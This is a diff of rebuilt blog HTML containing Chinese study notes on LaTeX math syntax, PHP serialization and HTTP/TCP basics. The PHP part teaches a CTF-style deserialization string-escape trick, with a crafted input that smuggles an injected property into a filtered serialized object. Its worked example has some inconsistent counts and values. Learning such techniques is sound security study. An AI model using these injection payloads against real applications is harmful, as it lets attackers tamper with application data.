+class="math display">\[ \overline{x+y} \qquad \underline{a+b}
 \]</span></p>
-<p>命令：, 分别在表达式上、下方给出一个水平的大括号 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$ \overbrace&#123;1+2+\cdots+n&#125;^&#123;n个&#125; \qquad \underbrace&#123;a+b+\cdots+z&#125;_&#123;26&#125; $$</span><br></pre></td></tr></table></figure> <span class="math display">\[ \overbrace{1+2+\cdots+n}^{n个} \qquad
+<p>命令：, 分别在表达式上、下方给出一个水平的大括号 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$ \overbrace&#123;1+2+\cdots+n&#125;^&#123;n个&#125; \qquad \underbrace&#123;a+b+\cdots+z&#125;_&#123;26&#125; $$</span><br></pre></td></tr></table></figure> <span
+class="math display">\[ \overbrace{1+2+\cdots+n}^{n个} \qquad
 \underbrace{a+b+\cdots+z}_{26} \]</span></p>
 <h2 id="向量">向量</h2>
 <p>命令：<code>\vec</code>表示向量，<code>\overrightarrow</code>表示箭头向右的向量，<code>\overleftarrow</code>表示箭头向左的向量
@@ -682,7 +962,8 @@ x&#39;&#39;_{12} \]</span></p>
 <h2 id="希腊字母">希腊字母</h2>
 <p>在LaTeX中通过反斜杠，将读音首字母大写即可输入其大写形式，详见下表
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$ \alpha^&#123;2&#125; + \beta = \Theta $$</span><br></pre></td></tr></table></figure> <span class="math display">\[ \alpha^{2} + \beta = \Theta
-\]</span> <img src="https://pic1.zhimg.com/v2-da3e717cf670582fbfbdddee33073524_r.jpg"></p>
+\]</span> <img
+src="https://pic1.zhimg.com/v2-da3e717cf670582fbfbdddee33073524_r.jpg" /></p>
 <h1 id="多行公式">多行公式</h1>
 <p>通过<code>cases</code>环境实现公式的组合，<code>&amp;</code>分隔公式和条件，还可以通过<code>\limits</code>来让x→0位于lim的正下方而非默认在lim符号的右下方显示
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$$ D(x)= \begin&#123;cases&#125;</span><br><span class="line">\lim\limits_&#123;x \to 0&#125; \frac&#123;a^x&#125;&#123;b+c&#125;, &amp; x&lt;3 \\</span><br><span class="line">\pi, &amp; x=3 \\</span><br><span class="line">\int_a^&#123;3b&#125;x_&#123;ij&#125;+e^2 \mathrm&#123;d&#125;x, &amp; x&gt;3 \\ </span><br><span class="line">\end&#123;cases&#125;$$</span><br></pre></td></tr></table></figure> <span class="math display">\[ D(x)= \begin{cases}
@@ -691,7 +972,8 @@ x&#39;&#39;_{12} \]</span></p>
 \int_a^{3b}x_{ij}+e^2 \mathrm{d}x, &amp; x&gt;3 \\
 \end{cases}\]</span></p>
 <h2 id="拆分单个公式">拆分单个公式</h2>
-<p>通过<code>split</code>环境实现公式拆分 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$$\begin&#123;split&#125;</span><br><span class="line">\cos 2x &amp; =\cos^2x - \sin^2x \\</span><br><span class="line">&amp; =2 \cos^2x -1</span><br><span class="line">\end&#123;split&#125;$$</span><br></pre></td></tr></table></figure> <span class="math display">\[\begin{split}
+<p>通过<code>split</code>环境实现公式拆分 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$$\begin&#123;split&#125;</span><br><span class="line">\cos 2x &amp; =\cos^2x - \sin^2x \\</span><br><span class="line">&amp; =2 \cos^2x -1</span><br><span class="line">\end&#123;split&#125;$$</span><br></pre></td></tr></table></figure> <span
+class="math display">\[\begin{split}
 \cos 2x &amp; =\cos^2x - \sin^2x \\
 &amp; =2 \cos^2x -1
 \end{split}\]</span></p>
@@ -762,7 +1044,7 @@ x&#39;&#39;_{12} \]</span></p>
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>序列化就是将一个对象转化成字符串，<br>
+          <p>序列化就是将一个对象转化成字符串，<br />
 反序列化则相反，将字符串重新恢复成对象</p>
 <table>
 <thead>
@@ -784,14 +1066,14 @@ x&#39;&#39;_{12} \]</span></p>
 </table>
 <p>对象的序列化有利于对象的<strong>保存和传输</strong> # PHP的序列化
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>(); </span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;adedyui&#125;&#x27;</span>; </span><br><span class="line"><span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>; </span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span> ;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">/*输出结果 </span></span><br><span class="line"><span class="comment">O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;   </span></span><br><span class="line"><span class="comment">O代表对象，因为我们序列化的是一个对象；序列化数组的话则用A来表示 </span></span><br><span class="line"><span class="comment">3代表类的名字长三个字符 </span></span><br><span class="line"><span class="comment">Ctf 是类名 </span></span><br><span class="line"><span class="comment">3代表这个类里有三个属性(三个变量) </span></span><br><span class="line"><span class="comment">s代表字符串 </span></span><br><span class="line"><span class="comment">4代表属性名的长度 </span></span><br><span class="line"><span class="comment">flag是属性名 </span></span><br><span class="line"><span class="comment">s:13:&quot;flag&#123;adedyui&#125;&quot; 字符串，属性长度，属性值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-serialize()函数会检查类中是否存在魔术方法<code>__sleep()</code>,如果存在，<code>__sleep()</code>方法会先被调用，然后才执行序列化操作。<br>
+serialize()函数会检查类中是否存在魔术方法<code>__sleep()</code>,如果存在，<code>__sleep()</code>方法会先被调用，然后才执行序列化操作。<br />
 可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;ldz&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;age&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();</span><br><span class="line">    <span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;adedyui&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line">    <span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span> ;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出结果</span></span><br><span class="line">    <span class="comment">//O:3:&quot;Ctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;adedyui&#125;&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><code>sleep()</code>方法使flag、age属性序列化，而name并没有被序列化。</p>
 <h1 id="访问控制修饰符">访问控制修饰符</h1>
 <p>根据<strong>访问控制修饰符的不同</strong>，序列化后的<strong>属性长度</strong>和<strong>属性值</strong>会有所不同。
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>(公有)</span><br><span class="line"><span class="keyword">protected</span>(受保护)   <span class="comment">//%00*%00属性名</span></span><br><span class="line"><span class="keyword">private</span>(私有的)     <span class="comment">//%00类名%00属性名</span></span><br></pre></td></tr></table></figure>
-protected属性被序列化的时候<strong>属性名</strong>会变成%00*%00<strong>属性名</strong><br>
+protected属性被序列化的时候<strong>属性名</strong>会变成%00*%00<strong>属性名</strong><br />
 private属性被序列化的时候<strong>属性名</strong>会变成%00<strong>类名</strong>%00<strong>属性名</strong>
 %00为空白符，长度为1 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&#x27;ldz&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span>  <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出结果</span></span><br><span class="line">    <span class="comment">//O:3:&quot;Ctf&quot;:3:&#123;s:4:&quot;flag&quot;;s:10:&quot;flag&#123;****&#125;&quot;;s:7:&quot;*name&quot;;s:3:&quot;ldz&quot;;s:8:&quot;Ctfage&quot;;s:2:&quot;10&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> 可以看到 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s:<span class="number">7</span>:<span class="string">&quot;*name&quot;</span> <span class="comment">//*前后出现两个空白符，一个空白符长度为1，所以序列化后该属性长度为7</span></span><br><span class="line">s:<span class="number">8</span>:<span class="string">&quot;Ctfage&quot;</span> <span class="comment">//类名Ctf前后出现两个空白符，所以长度为8</span></span><br></pre></td></tr></table></figure></p>
 <h1 id="php的反序列化">PHP的反序列化</h1>
@@ -805,7 +1087,7 @@ private属性被序列化的时候<strong>属性名</strong>会变成%00<strong>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;str&quot;:2:&#123;s:4:&quot;text&quot;;s:6:&quot;123456&quot;;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;&#125;abc</span><br></pre></td></tr></table></figure> 其中超出部分的<code>abc</code>并不会被反序列化。</li>
 <li>可以反序列化类中不存在的元素。 # 反序列化字符逃逸 ## 字符增多
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">str</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&quot;pabc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;pp&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">str</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//O:3:&quot;str&quot;:2:&#123;s:4:&quot;text&quot;;s:4:&quot;pabc&quot;;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;&#125;</span></span><br><span class="line"><span class="variable">$a_1</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_1</span>;</span><br><span class="line"><span class="comment">//O:3:&quot;str&quot;:2:&#123;s:4:&quot;text&quot;;s:4:&quot;ppabc&quot;;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-序列化后的字符串中的<code>p</code>都会被<code>pp</code>代替，但前面的长度不变，就会多出一个字符。<br>
+序列化后的字符串中的<code>p</code>都会被<code>pp</code>代替，但前面的长度不变，就会多出一个字符。<br />
 如果我们想要修改<code>name</code>的值为<code>Peter</code>。需要传入参数<code>";s:4:"name";s:5:"Peter";&#125;</code>长度为26，则需要输入一共26个<code>p</code>(构造代码的长度除以多出的字符数，26/1=26)。当<code>text</code>的参数为
 <code>pppppppppppppppppppppabc";s:4:"name";s:5:"Peter";&#125;</code>时，结果为
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//O:3:&quot;str&quot;:2:&#123;s:4:&quot;text&quot;;s:55:&quot;ppppppppppppppppppppppppppabc&quot;;s:4:&quot;name&quot;;s:5:&quot;Peter&quot;;&#125;&quot;;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;&#125;</span></span><br><span class="line"><span class="variable">$a_1</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_1</span>;</span><br><span class="line"><span class="comment">//O:3:&quot;str&quot;:2:&#123;s:4:&quot;text&quot;;O:3:&quot;str&quot;:2:&#123;s:4:&quot;text&quot;;s:55:&quot;ppppppppppppppppppppppppppppppppppppppppppppppppppppabc&quot;;s:4:&quot;name&quot;;s:5:&quot;Peter&quot;;&#125;&quot;;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;&#125;</span></span><br></pre></td></tr></table></figure> 这时反序列化<code>$a_1</code> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span>(str)<span class="comment">#1 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;text&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">55</span>) <span class="string">&quot;ppppppppppppppppppppppppppppppppppppppppppppppppppppabc&quot;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Peter&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -897,32 +1179,34 @@ private属性被序列化的时候<strong>属性名</strong>会变成%00<strong>
 <h2 id="tcpip的分层管理">TCP/IP的分层管理</h2>
 <p>TCP/IP协议族按层次分别分为应用层、传输层、网络层和数据链路层。</p>
 <h3 id="应用层">应用层</h3>
-<p>应用层决定了向用户提供应用服务时通信的活动。<br>
+<p>应用层决定了向用户提供应用服务时通信的活动。<br />
 如FTP（File Transfer Protocol，文件传输协议）和DNS（Domain Name
 Systyem，域名系统）服务。HTTP协议也处于该层。</p>
 <h3 id="传输层">传输层</h3>
-<p>传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。<br>
+<p>传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。<br />
 在传输层有两个性质不同的协议：TCP（Transmission Control
 Protocol，传输控制协议）和UDP（User Data
 Protocol，用户数据报协议）。</p>
 <h3 id="网络层又名网络互连层">网络层（又名网络互连层）</h3>
 <p>网络层用来处理在网络上流动的数据包。数据包时网络传输的最小数据单位。该层规定了通过怎样的路径到达对方计算机，并把数据包传送给对方。</p>
-<h3 id="链路层又名数据链路层网络接口层">链路层（又名数据链路层，网络接口层）</h3>
+<h3
+id="链路层又名数据链路层网络接口层">链路层（又名数据链路层，网络接口层）</h3>
 <p>用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（Network
 Interface
 Card，网络适配器，及网卡），及光纤等物理可见部分（海报可连接器等一切传输媒介）。</p>
 <h2 id="tcpip通信传输流">TCP/IP通信传输流</h2>
-<p>利用TCP/IP协议进行网络通信时，会通过分层顺序与对方进行通信。发送端从应用层往下走，接收端则往应用层往上走。<br>
+<p>利用TCP/IP协议进行网络通信时，会通过分层顺序与对方进行通信。发送端从应用层往下走，接收端则往应用层往上走。<br />
 发送端在层与层之间传输数据时，每经过一层必定会被打上一个该层所属的首部信息。反之，接收端在层与层传递数据时，每经过一层会把对应的首部消去，这种把数据信息包装起来的做法称为<strong>封装</strong>。</p>
-<h1 id="与http关系密切的协议iptcp和dns">与HTTP关系密切的协议：IP、TCP和DNS</h1>
+<h1
+id="与http关系密切的协议iptcp和dns">与HTTP关系密切的协议：IP、TCP和DNS</h1>
 <h2 id="负责传输的ip协议">负责传输的IP协议</h2>
 <p>按层次分，IP（Internat
 Protocol）网际协议位于网络层。IP协议的作用时把各种书包传送给对方。而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是IP地址和MAC地址（Media
-Access Control Address）。<br>
-IP地址指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，但是MAC地址基本不会更改。<br>
+Access Control Address）。<br />
+IP地址指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，但是MAC地址基本不会更改。<br />
 IP间的通信依赖MAC地址。通常经过多台计算机和网络设备中转才能连接到对方，中转时会利用下一站中转设备的MAC地址来搜索下一个中转目标。这时，会采用ARP协议（Address
 Resolution
-Protocol）。<strong>ARP协议是一种用以解析地址的协议，根据通信方的IP地址就可以反查出对应的MAC地址。</strong><br>
+Protocol）。<strong>ARP协议是一种用以解析地址的协议，根据通信方的IP地址就可以反查出对应的MAC地址。</strong><br />
 在到达通信目标前的中转过程中，那些计算机和路由器等网络设备只能获悉很粗略的传输路线。这种机制称为<strong>路由选择（routing）</strong>
 ，<em>无论哪台计算机、哪台网络设备，它们都无法全面掌握互联网中的细节。</em></p>
 <h2 id="确保可靠的tcp协议">确保可靠的TCP协议</h2>
@@ -930,8 +1214,8 @@ Protocol）。<strong>ARP协议是一种用以解析地址的协议，根据通�
 Stream
 Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。</p>
 <p>为了准确无误地将数据送达目标处，T。CP协议采用了<strong>三次握手（three-way
-handshaking）策略</strong>。握手过程中使用了TCP的标志（flag）--SYN（synchronize）和ACK(acknowledgement)。<br>
-发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。<br>
+handshaking）策略</strong>。握手过程中使用了TCP的标志（flag）--SYN（synchronize）和ACK(acknowledgement)。<br />
+发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。<br />
 若在握手过程中某个阶段莫名终端，TCP协议会再次以相同的顺序发送相同的数据包。</p>
 <h1 id="负责域名解析的dns服务">负责域名解析的DNS服务</h1>
 <p>DNS（Domain Name
@@ -944,44 +1228,45 @@ Locator,统一资源定位符）使用Web浏览器等访问Web页面时需要输
 </ul>
 <h2 id="统一资源标识符">统一资源标识符</h2>
 <ul>
-<li>Uniform<br>
+<li>Uniform<br />
 规定统一的格式可方便处理多种不同类型的资源，而不用根据上下文环境来识别资源指定的访问方式。另外，加入新增的协议方案（如https:或ftp:）也更容易。</li>
-<li>Resource<br>
+<li>Resource<br />
 资源的定义是“可标识的任何东西”，资源不仅可以是单一的，也可以是多数的集合体。</li>
-<li>Identifier<br>
+<li>Identifier<br />
 表示可标识的对象。也称为标识符。</li>
 </ul>
 <p>综上所述，URI就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型名称。</p>
 <h2 id="uri格式">URI格式</h2>
 <p>表示指定的URI，要使用涵盖全部必要信息的绝对URI、绝对URL以及相对URL。相对URL，是指从浏览器中基本URI处指定的URL，形如<code>/image/logo.gif</code>。</p>
-<p><code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code><br>
+<p><code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code><br />
 * 协议方案
 使用http：或https：等协议方案名获取访问资源时要指定协议类型。也可使用data：或javascript：这类指定数据或脚本程序的方案名。
-* 服务器地址<br>
-使用绝对URI必须指定待访问的服务器地址。地址可以是类似hackr.jp这种DNS可解析的名称，或是192.168.1.1这类IPv4地址名，还可以是[0:0:0:0:0:0:0:1]这样用方括号括起来的IPv6地址名。<br>
+* 服务器地址<br />
+使用绝对URI必须指定待访问的服务器地址。地址可以是类似hackr.jp这种DNS可解析的名称，或是192.168.1.1这类IPv4地址名，还可以是[0:0:0:0:0:0:0:1]这样用方括号括起来的IPv6地址名。<br />
 * 服务器端口号 指定服务器连接的网络端口号。若省略则自动使用默认端口号。
 * 带层次的文件路径 * 查询字符串
 针对已指定的文件路径内的资源，可以使用查询字符串传入任意参数。此项可选。
 * 片段标识符 使用片段标识符通常可标记处已获取资源中的子资源。可选。</p>
 <h1 id="简单的http协议">简单的HTTP协议</h1>
-<h2 id="http协议用于客户端和服务端之间的通信">HTTP协议用于客户端和服务端之间的通信</h2>
+<h2
+id="http协议用于客户端和服务端之间的通信">HTTP协议用于客户端和服务端之间的通信</h2>
 <p>请求访问文本或图像的一端称为客户端，而提供资源响应的一端称为服务器端。</p>
 <h2 id="通过请求和响应的交换达成通信">通过请求和响应的交换达成通信</h2>
-<p><strong>请求报文是由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成的。</strong><br>
+<p><strong>请求报文是由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成的。</strong><br />
 <strong>响应报文基本上由协议版本、状态码（标识请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成。</strong></p>
 <h2 id="http是不保存状态的协议">HTTP是不保存状态的协议</h2>
 <p>HTTP是一种不保存状态，即无状态（stateless）协议。HTTP协议自身不对请求和响应之间的通信状态进行保存。为了实现期望的保持状态功能，引入了Cookie技术。</p>
 <h2 id="告知服务器意图的http方法">告知服务器意图的HTTP方法</h2>
 <ul>
-<li>GET：获取资源<br>
+<li>GET：获取资源<br />
 GET方法用来请求访问已被URI识别的资源，指定的资源经服务器端解析后返回响应内容。</li>
 <li>POST：传输实体主体</li>
-<li>PUT：传输文件<br>
+<li>PUT：传输文件<br />
 就像FTP协议的文件上传一样，要求再请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。</li>
 <li>HEAD：获得报文首部</li>
 <li>DELETE：删除文件</li>
 <li>OPTIONS：询问支持的方法</li>
-<li>TRICE：追踪路径<br>
+<li>TRICE：追踪路径<br />
 发送请求时，在Max-Forwards首部字段中填入数值，每经过一个服务器端就将该数字减1，当数值刚好减到0时，就停止继续传输，最后接到请求的服务器端则返回状态码200
 OK的响应。</li>
 <li>CONNECT：要求用隧道协议连接代理
@@ -994,13 +1279,13 @@ Security，传输层安全）协议把通信内容加密后经网络隧道传输
 <h1 id="http报文内的http信息">HTTP报文内的HTTP信息</h1>
 <h2 id="http报文">HTTP报文</h2>
 <p>HTTP报文大致可分为报文首部和报文主体两块，两者由空行（CR+LF）来划分。
-* 请求行<br>
-包含用于请求的方法、请求URI和HTTP版本。 * 状态行<br>
-包含表明响应结果的状态码，原因语句和HTTP版本。<br>
-* 首部字段<br>
-包含表示请求和响应的各种条件和属性的各类首部。<br>
+* 请求行<br />
+包含用于请求的方法、请求URI和HTTP版本。 * 状态行<br />
+包含表明响应结果的状态码，原因语句和HTTP版本。<br />
+* 首部字段<br />
+包含表示请求和响应的各种条件和属性的各类首部。<br />
 一般有4种首部，分别时：通用首部、请求首部、响应首部和实体首部。 *
-其他<br>
+其他<br />
 可能包含HTTP的RFC里未定义的首部（Cookie等）。</p>
 <h2 id="编码提升传输效率">编码提升传输效率</h2>
 <h3 id="压缩传输的内容编码">压缩传输的内容编码</h3>
@@ -1014,34 +1299,34 @@ Coding）。分块传输编码会将实体主体分成多个部分（块）。�
 <h2 id="发送多种数据的多部分对象合集">发送多种数据的多部分对象合集</h2>
 <p>发送邮件时，我们可以在邮件里写入文字并添加多份附件。这是因为采用了MIME（Multipurpose
 Internet Mail
-Extensions，多用途因特网邮件扩展）机制。他允许邮件处理文本、图片、视频等多个不同类型的数据。而在MIME扩展种会使用一种称为多部分对象集合（Multipart）的方法，来容纳多份不同类型的数据。<br>
-多部分对象集合包含的对象如下： * multipart/form-data<br>
-在Web表单文件上传时使用。 * multipart/byteranges<br>
-状态码206响应<br>
+Extensions，多用途因特网邮件扩展）机制。他允许邮件处理文本、图片、视频等多个不同类型的数据。而在MIME扩展种会使用一种称为多部分对象集合（Multipart）的方法，来容纳多份不同类型的数据。<br />
+多部分对象集合包含的对象如下： * multipart/form-data<br />
+在Web表单文件上传时使用。 * multipart/byteranges<br />
+状态码206响应<br />
 报文包含了多个范围的内容时使用</p>
-<p>在HTTP报文种使用多部分对象集合时，需要在首部字段里加上Content-type。使用boundary字符串来划分多部分对象集合指明的各类实体。在boundary字符串指定的各个实体的起始行之前插入“--”标记。而在多部分对象集合对应的字符串的最后插入“--”标记作为结束。<br>
+<p>在HTTP报文种使用多部分对象集合时，需要在首部字段里加上Content-type。使用boundary字符串来划分多部分对象集合指明的各类实体。在boundary字符串指定的各个实体的起始行之前插入“--”标记。而在多部分对象集合对应的字符串的最后插入“--”标记作为结束。<br />
 多部分对象集合的每个部分类型中，都可以含有首部字段。另外，可以在某个部分中嵌套使用多部分对象集合。</p>
 <h2 id="获取部分内容的范围请求">获取部分内容的范围请求</h2>
 <p>指定范围发送的请求叫做范围请求（Range
 Request），执行范围请求时，会用到首部字段Range来指定资源的byte范围。指定形式如下：
-* 5001~10000字节<br>
